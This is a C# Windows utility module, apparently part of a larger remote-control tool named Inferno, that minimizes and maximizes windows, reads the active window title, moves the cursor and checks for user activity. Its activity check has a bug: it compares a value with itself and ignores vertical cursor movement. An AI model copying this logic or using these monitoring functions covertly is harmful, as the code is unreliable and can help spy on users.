using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Inferno
{
	internal class activity
    {
		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		public struct POINT
		{
			public int X;
			public int Y;
		}

		[DllImport("user32.dll")]
		private static extern bool GetCursorPos(out POINT lpPoint);
		[DllImport("user32.dll")]
		static extern bool SetCursorPos(int X, int Y);
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowTextLength(IntPtr hWnd);
		[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
		private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
		[DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
		private static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

		// Minimize all windows
		public static void minimizeAllWindows()
		{
			IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
			SendMessage(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
			core.Exit("All windows are minimized", output);
		}

		// Maximize all windows
		public static void maximizeAllWindows()
		{
			IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
			SendMessage(lHwnd, 0x111, (IntPtr)416, IntPtr.Zero);
			core.Exit("All windows are maximized", output);
		}

		// Get active window
		public static void getWindowTitle()
		{

			string result = string.Empty;
			IntPtr foregroundWindow = GetForegroundWindow();
			int num = GetWindowTextLength(foregroundWindow) + 1;
			StringBuilder stringBuilder = new StringBuilder(num);
			bool flag = GetWindowText(foregroundWindow, stringBuilder, num) > 0;
			if (flag)
			{
				result = stringBuilder.ToString();
			}
			output.window = result;
			core.Exit("Active window title received", output);
		}
		// Get cursor location
		private static int[] getCursorLocation()
		{
			POINT point;
			GetCursorPos(out point);
			int[] result = new int[2]
			{
				point.X,
				point.Y
			};
			return result;
		}
		// Get cursor position
		public static void getCursorPosition()
		{
			output.cursor = getCursorLocation();
			core.Exit("Cursor position received", output);
		}
		// Set cursor position
		public static void setCursorPosition(int x, int y)
		{
			SetCursorPos(x, y);
			core.Exit("Cursor position set", output);
		}

		// Check if user active
		public static void userIsActive(int wait = 3000)
		{
			bool result;
			int[] c1 = getCursorLocation();
			System.Threading.Thread.Sleep(wait);
			int[] c2 = getCursorLocation();
			if(c1[0] != c2[0] || c1[1] != c1[1]) {
				result = true;
			} else
			{
				result = false;
			}
			output.userActive = result;
			core.Exit("User is active", output);
		}
	}
}
